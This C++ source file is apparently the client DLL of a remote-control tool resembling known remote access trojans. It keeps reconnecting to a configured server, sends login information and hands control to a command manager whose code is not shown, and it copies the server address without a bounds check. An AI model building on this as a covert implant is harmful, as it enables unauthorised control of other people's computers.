// ClientDll.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include "Common.h"
#include "IOCPClient.h"
#include <IOSTREAM>
#include "LoginServer.h"
#include "KernelManager.h"
using namespace std;

char  g_szServerIP[MAX_PATH] = {0};  
unsigned short g_uPort = 0; 
HINSTANCE  g_hInstance = NULL;        
DWORD WINAPI StartClient(LPVOID lParam);

BOOL APIENTRY DllMain( HINSTANCE hInstance, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    
	
	switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:	
	case DLL_THREAD_ATTACH:
		{
			g_hInstance = (HINSTANCE)hInstance; 

			break;
		}		
	case DLL_PROCESS_DETACH:
        break;
    }
	return TRUE;
}


VOID  TestRun(char* szServerIP,unsigned short uPort)
{
//	MessageBox(NULL,"3","2",2);

	memcpy(g_szServerIP,szServerIP,strlen(szServerIP));
	g_uPort = uPort;

//	HANDLE hThread = _CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)StartAddress, 
//		(LPVOID)g_szServerIP,0,NULL);   


	HANDLE hThread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)StartClient,NULL,0,NULL);

	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);   
}

DWORD WINAPI StartClient(LPVOID lParam)
{



	IOCPClient  ClientObject;

	BOOL  bOk = FALSE;

	while (TRUE)
	{


		if (bOk==TRUE)
		{
			break;
		}

        DWORD dwTickCount = GetTickCount();  
		if (!ClientObject.ConnectServer(g_szServerIP, g_uPort))
		{
		//	bBreakError = CONNECT_ERROR;       //连接错误跳出本次循环  等待再次连接
			continue;
		}


		//准备第一波数据
		SendLoginInfor(&ClientObject,GetTickCount()-dwTickCount); 



		CKernelManager	Manager(&ClientObject);   
		DWORD	dwIndex = 0;
		do 
		{

			dwIndex  = WaitForSingleObject(ClientObject.m_hEvent, 100);

			dwIndex = dwIndex-WAIT_OBJECT_0;



			bOk = TRUE;
			

		} while (dwIndex!=0);

		


	}


	cout<<"退出Do While"<<endl;

	return 0;
} 
